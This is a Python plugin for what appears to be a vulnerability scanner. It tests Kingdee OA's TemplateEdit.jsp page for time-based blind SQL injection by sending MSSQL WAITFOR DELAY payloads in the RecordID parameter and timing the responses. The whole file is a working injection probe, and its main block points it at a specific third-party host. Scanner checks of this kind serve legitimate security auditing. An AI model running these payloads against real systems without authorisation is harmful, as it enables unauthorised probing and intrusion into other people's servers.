#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = rabit2013
#refer: http://www.hackdig.com/11/hack-28820.htm
import time
def assign(service, arg):
    if service == "kingdee":
        return True, arg

def audit(arg):
    payload0="kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:0'--"
    t0 = time.time()
    code0,_,_,_,_ = curl.curl2(arg+payload0)
    t0_end = time.time()-t0
    payload5="kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:5'--"
    t5 = time.time()
    code5,_,_,_,_ = curl.curl2(arg+payload5)
    t5_end = time.time()-t5
    if code0==200 and code5==200 and t5_end-t0_end>4.5:
        security_hole(arg+payload5)

if __name__ == '__main__':
    from dummy import *
    audit(assign('kingdee','http://oa.roen.cn/')[1])